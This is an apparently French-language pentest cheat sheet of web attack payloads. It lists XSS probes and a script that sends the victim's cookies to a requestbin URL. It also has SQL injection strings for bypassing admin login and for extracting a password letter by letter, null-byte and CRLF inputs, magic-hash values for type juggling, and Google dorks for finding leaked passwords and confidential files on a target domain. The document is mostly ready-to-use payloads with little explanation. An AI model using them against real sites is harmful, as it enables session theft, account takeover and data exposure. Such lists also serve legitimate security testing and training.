# XSS

- &lt;script&gt;alert(1)&lt;/script&gt; *(le payload de base pour tester si la faille est présente)*
- &lt;img src=x onerror=alert(1) /&gt; *(une alternative si le mot clef “script” est bloqué)*
- &lt;script&gt;$.get(“[https://votrerequestbin.com?cookie=”.concat(document.cookie)](https://votrerequestbin.com?cookie=%E2%80%9D.concat%28document.cookie%29 "https://votrerequestbin.com?cookie=%E2%80%9D.concat(document.cookie)"), function(response){ console.log(response);});&lt;/script&gt;

**Lien utile :**

https://public.requestbin.com/

Permet d’obtenir un serveur disposant d’une URL accessible sur internet et affichant toutes les requêtes reçues. S’utilise généralement pour s’envoyer un cookie via une faille XSS.

&nbsp;

# Injection SQL

- admin’;# *(pour essayer de se connecter avec le compte Admin sans renseigner de mots de passe)*
- admin’;–
- admin";#
- admin’;–
- ’ OR 1=1;#
- ’ OR 1=1;–
- toto’ OR (SELECT SUBSTRING(password, 1, 1) FROM users WHERE login=‘admin’) = ‘a’;# *(puis tester, b, puis c, etc et si le résultat retourne quelque chose, c’est qu’on a trouvé la 1ère lettre, on peut alors passer à la lettre suivante et recommancer.*

# Null Byte (fin de chaîne de caractère)

- %00
- \\x00

https://www.thehacker.recipes/web/inputs/null-byte-injection

# CRLF (retour à la ligne)

- %0A
- %0a
- %0D
- %0d
- %0A%0D
- %0a%0d

# Password payloads (magic hashs)

- \[\] (MD5 & SHA1)
- 240610708 (MD5)
- 10932435112 (SHA1)
- TyNOQHUS (SHA256)

Lien utile:

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/bb71d4ad141bcffa87d21035a2bcbbd2f2818e45/Type Juggling/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/bb71d4ad141bcffa87d21035a2bcbbd2f2818e45/Type%20Juggling/README.md)

&nbsp;

# Autres liens utiles de manière générale pour le pentest

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master
- https://book.hacktricks.xyz/welcome/readme
- https://cheatsheet.haax.fr/
- https://github.com/kkrypt0nn/wordlists
- https://gchq.github.io/CyberChef/
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

&nbsp;

# Google Dorks

intitle:"index of" "ovpn"

(@domain-cible.com OR domain-cible.fr) ("password" OR "mot de passe") (filetype:xls OR filetype:txt)

inurl:github.com "wordlist"

filetype:pdf ("confidentiel" OR "ne pas diffuser") "domain-cible.com"

site:pastebin.com ("password" OR "combolist")

https://www.exploit-db.com/google-hacking-database
